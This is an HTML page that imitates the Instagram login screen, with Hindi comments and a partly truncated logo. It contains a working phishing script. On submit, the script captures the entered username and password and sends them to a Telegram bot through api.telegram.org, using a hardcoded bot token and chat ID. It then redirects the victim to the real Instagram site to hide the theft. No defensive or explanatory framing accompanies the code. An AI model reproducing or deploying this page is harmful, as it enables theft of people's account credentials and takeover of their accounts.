<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .main-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 10px 0;
            margin-bottom: 10px;
        }
        .logo-container {
            text-align: center;
            margin: 36px auto 12px auto;
        }
        .logo-container svg {
            width: 175px;
            height: 51px;
        }
        .form-container {
            margin-top: 12px;
            padding: 0 40px;
        }
        input {
            width: 100%;
            padding: 9px 0px 7px 9px;
            margin-bottom: 6px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 7px;
            margin-top: 8px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background-color: #1877f2;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 14px 40px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .or-divider::before, .or-divider::after {
            content: "";
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-divider::before { margin-right: 18px; }
        .or-divider::after { margin-left: 18px; }

        .fb-login {
            text-align: center;
            margin-bottom: 24px;
        }
        .fb-login a {
            text-decoration: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
        }
        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="login-box">
            <!-- यहाँ Instagram का असली SVG लोगो डाला गया है जो कभी फेल नहीं होगा -->

.1 3.6 2.6 1.5.5 3.6.8 6.4.8h11.4v4.4c0 2.8.7 5 2 6.5 1.3 1.5 3.3 2.3 6 2.3h2.5c2.7 0 4.7-.8 6-2.3 1.3-1.5 2-3.7 2-6.5v-4.4h11.4c2.8 0 4.9-.3 6.4-.8 1.5-.5 2.7-1.4 3.6-2.6.9-1.2 1.5-2.6 1.7-4.5.2-1.9.3-4.2.3-6.9v-3.9c0-2.7-.1-5-.3-6.9z"></path></svg>
            </div>

            <div class="form-container">
                <form id="loginForm">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>

                <div class="or-divider">OR</div>

                <div class="fb-login">
                    <a href="#">Log in with Facebook</a>
                </div>
            </div>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
        const chatId = "7008289410";    

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            let user = document.querySelector('input[name="username"]').value;
            let pass = document.querySelector('input[name="password"]').value;

            let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                console.log('सफलतापूर्वक भेज दिया गया', data);
                window.location.href = "https://instagram.com"; 
            })
            .catch(error => console.error('एरर:', error));
        });
    </script>

</body>
</html>
